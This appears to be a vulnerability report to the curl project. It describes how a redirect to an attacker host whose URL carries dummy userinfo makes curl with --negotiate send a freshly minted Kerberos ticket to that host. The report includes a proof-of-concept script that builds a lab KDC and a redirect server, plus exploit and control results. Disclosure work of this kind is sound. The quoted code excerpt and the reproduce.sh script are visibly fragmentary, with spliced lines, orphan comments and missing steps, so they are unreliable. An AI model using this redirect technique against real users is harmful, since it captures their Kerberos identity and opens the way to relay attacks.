## Vulnerability Details

Hi all,

I've discovered that curl can be made to send an "Authorization: Negotiate" header, carrying a freshly minted Kerberos ticket for the victim's ambient identity, to a host chosen by an HTTP redirect, without --location-trusted. All the attacker has to do is put arbitrary userinfo in the Location header they redirect to. This contradicts the guarantee documented for CURLOPT_UNRESTRICTED_AUTH, which says that with the option unset libcurl "does not send custom nor internally generated Authorization: or Cookie: headers on requests done to other hosts than the one used for the initial URL".

I have an end-to-end PoC against a real KDC on pristine upstream d1823ebc17e5778c30f8a6b2221a057ec607a9b7 (8.23.0-DEV), a control showing the protection holds when the userinfo is removed, and a small fix that I have verified closes it without regressing either normal Negotiate or --location-trusted. Details below.

How it works
------------

The gate asks "do I have any credentials?" when it should ask "am I still on the original host?"

```
  https://github.com/curl/curl/blob/d1823ebc17e5778c30f8a6b2221a057ec607a9b7/lib/http.c#L872-L878

    /* Either we have credentials for the origin we talk to or
       performing authentication is allowed here */
    if(data->state.creds || Curl_auth_allowed_to_host(data))
      result = output_auth_headers(data, conn, authhost, request,
                                   path_and_query, FALSE);
    else
      authhost->done = TRUE;
```

That "||" is the whole vulnerability. Either condition is enough.

The flow:

  1. You run `curl --negotiate -L http://intranet/` - Kerberos SSO, no password typed.
  2. `intranet` redirects you to `http://bob:alice@attacker.example/`.
  3. curl correctly drops *your* credentials, because it is a different host. But it then parses `bob:alice` out of the attacker's own URL and stores it in state.creds. That path has no origin check.
  4. Gate: credentials exist -> proceed. The origin check is never consulted.
  5. The Negotiate branch runs. It throws `bob:alice` away, goes to the KDC, and gets a fresh Kerberos ticket for HTTP/attacker.example. Sends it.

The attacker now holds a Kerberos AP-REQ for their own service, proving your identity.

What makes it odd is that a credential which is never used unlocks an authentication that does not use credentials. `bob:alice` is neither forwarded nor checked. Its only job is to be non-NULL.

Same PoC, one change, which is the proof that this and nothing else is the cause:

  | Redirect target                    | Attacker receives                                   |
  |------------------------------------|-----------------------------------------------------|
  | http://bob:alice@attacker.example/ | Authorization: Negotiate <ticket for HTTP/attacker> |
  | http://attacker.example/           | nothing                                             |


Code paths
----------

1. Application-set credentials ARE origin-checked, so yours are correctly dropped on the redirect.
```
   https://github.com/curl/curl/blob/d1823ebc17e5778c30f8a6b2221a057ec607a9b7/lib/url.c#L1355-L1360
```

2. Credentials taken from the URL are NOT origin-checked. The redirect target is attacker-chosen, so this repopulates state.creds for the foreign origin.
```
   https://github.com/curl/curl/blob/d1823ebc17e5778c30f8a6b2221a057ec607a9b7/lib/url.c#L1383-L1391
```

3. The gate accepts that, and output_auth_headers() runs for the foreign origin.
   https://github.com/curl/curl/blob/d1823ebc17e5778c30f8a6b2221a057ec607a9b7/lib/http.c#L874

4. The HTTPSIG branch guards against exactly this. The Negotiate branch directly below it does not - it only checks that the application did not set its own header.
```
   https://github.com/curl/curl/blob/d1823ebc17e5778c30f8a6b2221a057ec607a9b7/lib/http.c#L671-L704

         redirected URL bypass the cross-host auth boundary. */

        auth = "HTTPSIG";
        result = Curl_output_httpsig(data);

        result = Curl_output_negotiate(data, conn, proxy);

    else
```

Reproduction
------------

Verified on pristine upstream curl/curl d1823ebc17e5778c30f8a6b2221a057ec607a9b7 (8.23.0-DEV, GSS-API + SPNEGO, MIT krb5 1.22.2), and also on 557e43b237 of my own tree (8.22.1-DEV). Build with -DCURL_USE_GSSAPI=ON so that `curl -V` lists SPNEGO.

```
  VF_CURL=<curl-with-spnego> sh reproduce.sh exploit
  VF_CURL=<curl-with-spnego> sh reproduce.sh control
```

The script stands up a throwaway MIT Kerberos realm (KDC, one user principal, two service principals), kinits a victim who has never heard of attacker.poc.test, and runs curl against a legit origin that 301-redirects to an attacker origin. The only difference between the two arms is whether the Location header carries userinfo.

Results:

  exploit: attacker origin received Authorization: Negotiate (1060 b64 chars)
    AP-REQ principal fields: ['POC.TEST', 'HTTP', 'attacker.poc.test']
  control: attacker origin received NO Authorization header

The token is a SPNEGO wrapper (OID 1.3.6.1.5.5.2) over a krb5 AP-REQ (OID 1.2.840.113554.1.2.2) whose ticket sname is HTTP/attacker.poc.test in realm POC.TEST. legit.poc.test does not appear anywhere in it, so it is a newly minted ticket rather than a replay of the one sent to the first host. klist afterwards confirms the KDC issued HTTP/attacker.poc.test@POC.TEST to the victim, for a host the caller never asked to contact.

  reproduce.sh:
  ```sh

  #
  # Env overrides (defaults suit a Homebrew MIT krb5 on macOS):

  #   VF_KRB5   - MIT krb5 prefix                    (default /opt/homebrew/opt/krb5)
  #   VF_KDCP   - KDC port                           (default 19188)
  #   VF_APORT  - "legit" origin port                (default 19218)
  #   VF_BPORT  - "attacker" origin port             (default 19219)

  # must not inherit a marker left by the exploit arm.

  # data->state.creds non-NULL for the foreign origin and satisfies the

  fi

          supported_enctypes = aes256-cts:normal
      }

  export KRB5_KDC_PROFILE="$WORK/kdc.conf"
  export KRB5CCNAME="$WORK/victim.ccache"

  # never heard of it; only the KDC's realm membership matters.

  "$KRB5/sbin/kadmin.local" -q "addprinc -randkey HTTP/legit.poc.test"     >/dev/null 2>&1
  "$KRB5/sbin/kadmin.local" -q "addprinc -randkey HTTP/attacker.poc.test"  >/dev/null 2>&1
  "$KRB5/sbin/krb5kdc" -n -P "$WORK/kdc.pid" > "$WORK/kdc.log" 2>&1 &
  KDC_PID=$!
  i=0; while [ $i -lt 30 ]; do i=$((i+1)); sleep 0.1; done
  printf 'victimpass\n' | "$KRB5/bin/kinit" victim >/dev/null

  cat > "$WORK/a.py" <<EOF
  import http.server, sys
  class H(http.server.BaseHTTPRequestHandler):
      def do_GET(self):
          self.send_response(301)
          self.send_header("Location", "$LOC")
          self.send_header("Content-Length", "0")
          self.end_headers()
      def log_message(self, *a): pass

  #     victim's client presented an ambient-credential Negotiate token. ---

  # --negotiate selects SPNEGO; note the ABSENCE of --location-trusted.

    --resolve "legit.poc.test:$APORT:127.0.0.1" \
    --resolve "attacker.poc.test:$BPORT:127.0.0.1" \
  ```

## Impact

The attacker controls the long-term key for the SPN they redirected you to (think: website with an open redirect vulnerability), so they can decrypt the AP-REQ and learn your authenticated identity. With CURLOPT_GSSAPI_DELEGATION the ticket is forwardable, and on Windows SSPI an unknown SPN falls back to NTLM, which yields a relay-able NTLM exchange. I did not demonstrate either of those two outcomes, so they are not reflected in the CVSS score above.

Note this is not the classic "credential leak on redirect" pattern where an existing header value is forwarded to a new host. curl performs a complete, fresh authentication handshake against the attacker's service on your behalf, so the exposure is not bounded by what you previously sent.
